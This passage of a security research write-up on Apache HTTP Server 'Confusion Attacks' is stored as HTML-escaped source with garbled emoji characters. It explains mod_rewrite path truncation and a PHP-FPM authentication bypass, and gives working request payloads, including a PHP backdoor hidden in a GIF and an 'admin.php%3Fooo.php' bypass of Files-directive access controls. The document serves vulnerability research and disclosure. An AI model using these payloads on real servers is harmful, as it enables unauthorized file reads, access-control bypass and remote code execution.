    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ctx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perdir&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULEFLAG_DISCARDPATHINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;splitout_queryargs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;         &lt;span class=&quot;c1&quot;&gt;// &amp;lt;------- [!!!] Truncate the `r-&amp;gt;filename`&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;Ô∏è-1-1-1-path-truncation&quot;&gt;‚úîÔ∏è 1-1-1. Path Truncation&lt;/h5&gt;

&lt;p&gt;The first primitive leverages this truncation on the filesystem path. Imagine the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; &quot;^/user/(.+)$&quot; &quot;/var/user/$1/profile.yml&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The server would open the corresponding profile based on the username followed by the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user/&lt;/code&gt;, for example:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/profile.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/profile.yml&lt;/code&gt;, like:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/user/orange%2Fsecret.yml%3F
 &lt;span class=&quot;c&quot;&gt;# the output of file `/var/user/orange/secret.yml`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is our first primitive ‚Äî Path Truncation. Let‚Äôs pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember it‚Äî it will reappear in later attacks, gradually tearing open this seemingly little breach! üòú&lt;/p&gt;

&lt;h5 id=&quot;Ô∏è-1-1-2-mislead-rewriteflag-assignment&quot;&gt;‚úîÔ∏è 1-1-2. Mislead RewriteFlag Assignment&lt;/h5&gt;

&lt;p&gt;The second exploitation of the truncation primitive is to mislead the assignment of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteFlags&lt;/code&gt;. Imagine a sysadmin managing websites and their corresponding handlers through the following &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^(.+\.php)$  $1  [H=application/x-httpd-php]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If a request ends with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension, it adds the corresponding handler for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_php&lt;/code&gt; (this can also be an Environment Variable or Content-Type; you can refer to the official &lt;a href=&quot;https://httpd.apache.org/docs/2.4/rewrite/flags.html&quot;&gt;RewriteRule Flags&lt;/a&gt; manual for details).&lt;/p&gt;

&lt;p&gt;Since the truncation behavior of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_rewrite&lt;/code&gt; occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldn‚Äôt apply to by using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif
 &lt;span class=&quot;c&quot;&gt;# GIF89a &amp;lt;?=`id`;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl http://server/upload/1.gif%3fooo.php
 &lt;span class=&quot;c&quot;&gt;# GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;Ô∏è-primitive-1-2-acl-bypass&quot;&gt;‚öîÔ∏è Primitive 1-2. ACL Bypass&lt;/h4&gt;

&lt;p&gt;The second primitive of Filename Confusion occurs in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt;. Unlike the previous primitive which treats targets as a URL in all cases, this time &lt;strong&gt;the authentication and access control bypass is caused by the inconsistent semantic of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; among the modules!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It actually makes sense for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; to treat &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL, given that the primary  purpose of a Proxy is to ‚Äúredirect‚Äù requests to other URLs. However, security issues when different components interact ‚Äî especially the case when most modules by default treat the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a filesystem path, imagine you use a file-based access control, and now &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; treats &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; as a URL; this inconsistency can lead to the access control or authentication bypass!&lt;/p&gt;

&lt;p&gt;A classic example is when sysadmins use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive to restrict a single file, like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;admin.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;AuthType&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;Basic&lt;/span&gt; 
    &lt;span class=&quot;ss&quot;&gt;AuthName&lt;/span&gt; &quot;Admin Panel&quot;
    &lt;span class=&quot;nc&quot;&gt;AuthUserFile&lt;/span&gt; &quot;/etc/apache2/.htpasswd&quot;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; valid-user
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This type of configuration can be bypassed directly under the default PHP-FPM installation! It‚Äôs also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;http://server/admin.php%3Fooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php?ooo.php&lt;/code&gt;, which obviously does not match &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.php&lt;/code&gt;, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SetHandler&lt;/code&gt; directive:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: /etc/apache2/mods-enabled/php8.2-fpm.conf&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Using (?:pattern) instead of (pattern) is a small optimization that&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# avoid capturing the matching pattern (as $1) which isn&apos;t used here&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;.+\.ph(?:ar|p|tml)$&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;SetHandler&lt;/span&gt; &quot;proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost&quot;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;FilesMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; will rewrite &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; to the following URL and call the sub-module &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy_fcgi&lt;/code&gt; to handle the subsequent FastCGI protocol:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044&quot;&gt;sapi/fpm/fpm/fpm_main.c#L1044&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define APACHE_PROXY_FCGI_PREFIX &quot;proxy:fcgi://&quot;
#define APACHE_PROXY_BALANCER_PREFIX &quot;proxy:balancer://&quot;
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strncasecmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* advance to first character of hostname */&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;APACHE_PROXY_FCGI_PREFIX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* move past hostname and port */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;\0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;cm&quot;&gt;/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;apache_was_here&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/* ignore query string if sent by Apache (RewriteRule) */&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strchr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;env_script_filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;?&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, PHP-FPM first normalizes the filename and splits it at the question mark &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt; to extract the actual file path for execution (which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/admin.php&lt;/code&gt;). This leads to the bypass, and basically, &lt;strong&gt;all authentications or access controls based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Files&lt;/code&gt; directive for a single PHP file are at risk when running together with PHP-FPM!&lt;/strong&gt; üòÆ&lt;/p&gt;

&lt;p&gt;Many potentially risky configurations can be found on GitHub, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt; restricted to internal network access only:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# protect phpinfo, only allow localhost and local network access&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; php-info.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# LOCAL ACCESS ONLY&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;# Require local &lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# LOCAL AND LAN ACCESS&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Require&lt;/span&gt; ip 10 172 192.168
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Adminer blocked by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; adminer.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Protected &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmlrpc.php&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; xmlrpc.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Order&lt;/span&gt; Allow,Deny
    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CLI tools prevented from direct access:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt; &quot;cron.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;    &lt;span class=&quot;nc&quot;&gt;Deny&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Through an inconsistency in how the authentication module and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mod_proxy&lt;/code&gt; interpret the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-&amp;gt;filename&lt;/code&gt; field, all the above examples can be successfully bypassed with just a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;?&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;-2-documentroot-confusion&quot;&gt;üî• 2. DocumentRoot Confusion&lt;/h3&gt;

&lt;p&gt;The next attack we‚Äôre diving into is the confusion based on DocumentRoot! Let‚Äôs consider this Httpd configuration for a moment:&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;DocumentRoot&lt;/span&gt; /var/www/html
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt;  ^/html/(.*)$   /$1.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When you visit the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://server/html/about&lt;/code&gt;, which file do you think Httpd actually opens? Is it the one under the root directory, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/about.html&lt;/code&gt;, or is it from the DocumentRoot at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/about.html&lt;/code&gt;?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240809/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The answer is ‚Äî &lt;strong&gt;it accesses both paths&lt;/strong&gt;. Yep, that‚Äôs our second Confusion Attack. &lt;strong&gt;For any&lt;sup&gt;[1]&lt;/sup&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RewriteRule&lt;/code&gt;, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!&lt;/strong&gt; Amazing, right? üòâ&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Located within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Config&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VirtualHost Block&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Path: &lt;a href=&quot;https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939&quot;&gt;modules/mappers/mod_rewrite.c#L4939&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

